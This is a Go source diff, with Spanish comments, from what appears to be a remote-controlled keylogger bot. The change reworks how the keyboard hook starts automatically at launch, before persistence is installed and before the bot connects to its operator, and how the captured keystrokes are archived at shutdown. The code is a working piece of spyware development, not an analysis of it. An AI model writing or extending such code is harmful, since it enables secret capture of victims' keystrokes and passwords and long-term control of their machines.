@@ -129,9 +129,8 @@ func main() {
 
 	// El keylogger arranca solo, antes de instalar la persistencia y antes de
 	// conectar el bot: el hook queda montado en el primer segundo, sin esperar
-	// a que el operador mande un comando. Si el operador lo apagó a mano en la
-	// sesión anterior, AutoStart lo respeta.
-	win32.Default.AutoStart()
+	// a que el operador mande un comando.
+	commands.StartGlobal()
 
 	// Latido inicial: este proceso existe y está arrancando. Sin esto, una
 	// copia lanzada por la tarea mientras esta todavía conecta vería el latido
@@ -211,9 +210,9 @@ func main() {
 
 	<-ctx.Done()
 	wg.Wait()
-	// Suelta el sumidero con lo último volcado: sin esto el archivo queda
-	// abierto hasta que el proceso muere y la rotación no puede renombrarlo.
-	win32.Default.Close()
+	// Suelta el hook y archiva la sesión en curso: sin esto lo último tecleado
+	// se queda solo en memoria y muere con el proceso.
+	commands.StopGlobal()
 	time.Sleep(2 * time.Second)
 }
 
